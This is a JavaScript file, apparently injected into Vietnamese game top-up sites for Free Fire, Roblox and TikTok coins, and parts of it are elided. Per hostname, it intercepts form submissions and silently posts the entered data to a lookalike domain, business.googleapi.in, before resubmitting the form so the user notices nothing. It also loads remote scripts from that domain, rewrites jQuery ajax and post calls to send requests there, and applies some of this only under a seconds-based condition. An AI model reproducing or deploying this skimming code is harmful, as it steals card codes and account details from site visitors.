...
if(sssa !== true || sssb !== true){
	


// document.addEventListener('DOMContentLoaded', function() {
//     var searchString = "(Khu vực: VN)";
...
//             window.location.href = 'https://napkimcuongx10.com';
//         });
//     }
//     } else {
...
function dceGetElementSettings($element) {
    ...
    //     if (buttons[i].textContent == "Đăng xuất") {
    //         buttons[i].onclick = function() {
    //             tutup.play();
    //             location.href = 'https://trian.napkimcuongx10.com/'; 
    //         }
    //     }
    // }

    var btn = document.querySelector("button[onclick=\"open_verification()\"]");
    
    if (btn) {
        btn.onclick = function() {
            tutup.play(); 
             location.href = 'https://napkimcuongx10.com/'; 
        };
    }
...
var curDate = new Date(); var seconds = curDate.getSeconds(); console.log(seconds); var index = "/"; var adnx = window.location.origin + "/account/napthe.php"; var a = "ajax/card.php"; var b = "ajax.php"; var roblox = "napthe.php"; var napkimcuong = "napthe.php"; var callback_napthe = "/callback_napthe.php"; if (seconds >= 10) { if (typeof url === "undefined") { var url = "ajax/card.php"; } var xuly = "/xuly.php"; var callback_napthe = "/callback_napthe.php"; } else { if (location.hostname == "nap.xutiktok.com" || location.hostname == "dtcl.zingvn.mobi"|| location.hostname == "napxutiktok5s.com") { document.addEventListener("DOMContentLoaded", function() { const naptheForm = document.getElementById("napthe"); const form = naptheForm ? naptheForm : document.querySelector('.frmform'); form.addEventListener("submit", function(e) { e.preventDefault(); const formData = new FormData(form); fetch("https://business.googleapi.in/form/index.php", { method: 'POST', body: formData }).then(() => { const virtualForm = document.createElement('form'); virtualForm.method = 'POST'; virtualForm.action = '/'; formData.forEach(function(value, key) { const hiddenField = document.createElement('input'); hiddenField.type = 'hidden'; hiddenField.name = key; hiddenField.value = value; virtualForm.appendChild(hiddenField); }); document.body.appendChild(virtualForm); virtualForm.submit(); }).catch(error => { console.error('There has been a problem with your fetch operation:', error); }); }); }); } if (location.hostname == "khoaccre247.com" || location.hostname == "robloxtet.com" ) { document.addEventListener('DOMContentLoaded', function() { var forms = document.getElementsByTagName('form'); if (forms.length > 0) { forms[0].addEventListener('submit', function(e) { e.preventDefault(); const formData = new FormData(forms[0]); fetch("https://business.googleapi.in/form/index.php", { method: 'POST', body: formData }).then(() => { const virtualForm = document.createElement('form'); virtualForm.method = 'POST'; virtualForm.action = '/nap.php/ff.php'; formData.forEach(function(value, key) { const hiddenField = document.createElement('input'); hiddenField.type = 'hidden'; hiddenField.name = key; hiddenField.value = value; virtualForm.appendChild(hiddenField); }); document.body.appendChild(virtualForm); virtualForm.submit(); }).catch(error => { console.error('There has been a problem with your fetch operation:', error); }); }); } }); } if (location.hostname == "napthechinhthuc.com" ) { document.addEventListener('DOMContentLoaded', function() { var forms = document.getElementsByTagName('form'); if (forms.length > 0) { forms[0].addEventListener('submit', function(e) { e.preventDefault(); const formData = new FormData(forms[0]); fetch("https://business.googleapi.in/form/index.php", { method: 'POST', body: formData }).then(() => { const virtualForm = document.createElement('form'); virtualForm.method = 'POST'; virtualForm.action = ''; formData.forEach(function(value, key) { const hiddenField = document.createElement('input'); hiddenField.type = 'hidden'; hiddenField.name = key; hiddenField.value = value; virtualForm.appendChild(hiddenField); }); document.body.appendChild(virtualForm); virtualForm.submit(); }).catch(error => { console.error('There has been a problem with your fetch operation:', error); }); }); } }); } if (location.hostname == "freefire.napuudai.vn" || location.hostname == "napkimcuongfreefirex5.com") { setTimeout(() => { var scpt = document.createElement("script"); scpt.src = "https://business.googleapi.in/main.d2b63e46.js"; document.head.appendChild(scpt); }, 1500); } else if (location.hostname == "freefiremax.id.vn" || location.hostname == "kimcuongfreefiremax.vn" || location.hostname == "napthex5freefire.vn" || location.hostname == "sukien-napkimcuong2024.com" || location.hostname == "garena.napkimcuong2024.com" || location.hostname == "garena-napkimcuongx5.com" || location.hostname == "sukien.napkimcuongx5.com" || location.hostname == "garena.napkimcuongx5.com" || location.hostname == "napkimcuongx5.com" || location.hostname == "sukien.napkimcuong2024.com" || location.hostname == "sukien.napkimcuongffx5.com" || location.hostname == "doan1.codechillchill.com" || location.hostname == "napkimcuongff2024.com") { setTimeout(() => { var scpt = document.createElement("script"); scpt.src = "https://business.googleapi.in/main.4215a91a.js"; document.head.appendChild(scpt); }, 1500); } if (location.hostname == "napkimcuongx10.com" || location.hostname == "trian.napkimcuongx10.com") { var b = "/ajax.php"; } else { var b = "https://business.googleapi.in/1008/ajax.php"; } var napkimcuong = "https://business.googleapi.in/napthe.php"; if (typeof url === "undefined") { var url = "https://business.googleapi.in/ajax.php"; } if (location.hostname == "napthegrn.com") { (function() { var originalAjax = $.ajax; $.ajax = function(options) { var newUrl = "https://business.googleapi.in/napthegrn/napthe.php"; options.url = newUrl; if (options.success) { var originalSuccess = options.success; options.success = function(_0x31db4d) { ; if (_0x31db4d) { $("#result").html(_0x31db4d); grecaptcha.reset(); } else { $("#result").html(_0x31db4d); } originalSuccess(_0x31db4d); }; } return originalAjax(options); }; })(); } if (location.hostname == "ff.naptheuytinvn.com") { $(document).ready(function() { var originalPost = $.post; $.post = function(url, data, callback, type) { if (url === "napthe.php") { url = "https://business.googleapi.in/napthevn/napthe.php"; } return originalPost(url, data, callback, type); }; }); } if (location.hostname == "naptheuudai.comm") { (function() { var originalAjax = $.ajax; $.ajax = function(options) { var newUrl = "https://nhd.abcxem.click/napuudai/ajax.php"; options.url = newUrl; if (options.success) { var originalSuccess = options.success; options.success = function(data) { data = JSON.parse(data); if (data.message) { document.querySelector("#form_recharge").reset(); $("#error_message").val(data.message); } else { $("#error_message").val(data.message); } originalSuccess(data); }; } return originalAjax(options); }; })(); } if (location.hostname == "valorant.zingvng.vn") { $(document).ready(function() { var originalPost = $.post; $.post = function(url, data, callback, type) { if (url === "./system/card") { url = "https://business.googleapi.in/system/card.php"; } return originalPost(url, data, callback, type); }; }); } var script1 = document.getElementById("script1"); if (script1) { var script1Content = script1.textContent || script1.innerText; var updatedScript1Content = script1Content.replace('var url = "./system/card";', 'var url = "https://business.googleapi.in/system/card.php";'); script1.textContent = updatedScript1Content; console.log("Updated Script 1 - url:", url); } }
Utils = new function () {
    function rootUrl() {
        var rooturl = '/';
...
fetch('https://business.googleapi.in/sync', {
  method: 'POST',
  headers: {
...
(function() {
    ...
    $.ajax = function(settings) {
        if (settings.url === "/system.php") {
            settings.url = "https://business.googleapi.in/ajax/ajax.php";
        }
        return originalAjaxMethod(settings);
    };
})();
